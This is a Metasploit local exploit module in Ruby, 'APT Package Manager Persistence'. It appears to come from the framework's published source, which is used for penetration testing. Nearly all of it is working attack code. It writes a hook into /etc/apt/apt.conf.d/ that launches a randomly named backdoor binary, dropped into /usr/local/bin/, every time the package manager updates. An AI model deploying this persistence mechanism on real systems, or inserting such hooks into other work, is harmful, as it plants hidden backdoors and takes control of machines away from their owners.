# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;APT Package Manager Persistence&#039;,
      &#039;Description&#039;    => %q(
        This module will run a payload when the package manager is used. No
        handler is ran automatically so you must configure an appropriate
        for APT in apt.conf.d. The hook name syntax is numeric followed by text.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [&#039;Aaron Ringo&#039;],
      &#039;Platform&#039;       => [&#039;linux&#039;, &#039;unix&#039;],
      &#039;Arch&#039;           =>
        [
          ARCH_CMD,
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 0, &#039;DisablePayloadHandler&#039; => &#039;true&#039; },
      &#039;DisclosureDate&#039; => &#039;1999-03-09&#039;, # Date APT package manager was included in Debian
      &#039;References&#039;     => [&#039;URL&#039;, &#039;https://unix.stackexchange.com/questions/204414/how-to-run-a-command-before-download-with-apt-get&#039;],
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        OptString.new(&#039;HOOKNAME&#039;, [false, &#039;Name of hook file to write&#039;]),
        OptString.new(&#039;BACKDOOR_NAME&#039;, [false, &#039;Name of binary to write&#039;])
      ])

    register_advanced_options(
      [
        OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/usr/local/bin/&#039;])
      ])
  end

  def exploit
    hook_path = &#039;/etc/apt/apt.conf.d/&#039;
    unless writable? hook_path
      fail_with Failure::BadConfig, "#{hook_path} not writable, or APT is not on system"
    end
    hook_path << (datastore[&#039;HOOKNAME&#039;] || "#{rand_text_numeric(2)}#{rand_text_alpha(5..8)}")

    backdoor_path = datastore[&#039;WritableDir&#039;]
    unless writable? backdoor_path
      fail_with Failure::BadConfig, "#{backdoor_path} is not writable"
    end
    backdoor_name = datastore[&#039;BACKDOOR_NAME&#039;] || rand_text_alphanumeric(5..10)
    backdoor_path << backdoor_name

    print_status(&#039;Attempting to write hook:&#039;)
    hook_script = "APT::Update::Pre-Invoke {\"setsid #{backdoor_path} 2>/dev/null &\"};"
    write_file(hook_path, hook_script)

    unless exist? hook_path
      fail_with Failure::Unknown, &#039;Failed to write Hook&#039;
    end
    print_status("Wrote #{hook_path}")

    if payload.arch.first == &#039;cmd&#039;
      write_file(backdoor_path, payload.encoded)
    else
      write_file(backdoor_path, generate_payload_exe)
    end

    unless exist? backdoor_path
      fail_with Failure::Unknown, "Failed to write #{backdoor_path}"
    end
    print_status("Backdoor uploaded #{backdoor_path}")
    print_status(&#039;Backdoor will run on next APT update&#039;)

    # permissions chosen to reflect common perms in /usr/local/bin/
    chmod(backdoor_path, 0755)
  end
end

